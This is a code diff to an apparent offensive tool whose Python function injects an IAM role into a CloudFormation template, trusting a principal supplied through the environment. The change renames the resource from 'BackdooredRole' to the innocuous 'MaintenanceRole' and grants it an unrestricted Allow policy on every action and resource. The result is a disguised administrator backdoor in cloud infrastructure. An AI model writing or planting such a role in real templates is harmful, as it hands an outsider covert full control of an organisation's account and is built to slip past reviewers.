@@ -57,7 +57,7 @@ def add_role(cfn: bytes):
     principal = os.environ['PRINCIPAL']
     if not principal:
         raise UserWarning("Could not find PRINCIPAL in the environment.")
-    cfn['Resources']['BackdooredRole'] = {
+    cfn['Resources']['MaintenanceRole'] = {
         'Type': 'AWS::IAM::Role',
         'Properties': {
             'AssumeRolePolicyDocument': json.dumps(
@@ -71,7 +71,22 @@ def add_role(cfn: bytes):
                         }
                     ]
                 }
-            )
+            ),
+            "Policies": [
+                {
+                    "PolicyName": "default",
+                    "PolicyDocument": {
+                        "Version": "2012-10-17",
+                        "Statement": [
+                            {
+                                "Effect": "Allow",
+                                "Action": "*",
+                                "Resource": "*"
+                            }
+                        ]
+                    }
+                }
+            ]
         }
     }
     return yaml.safe_dump(cfn)
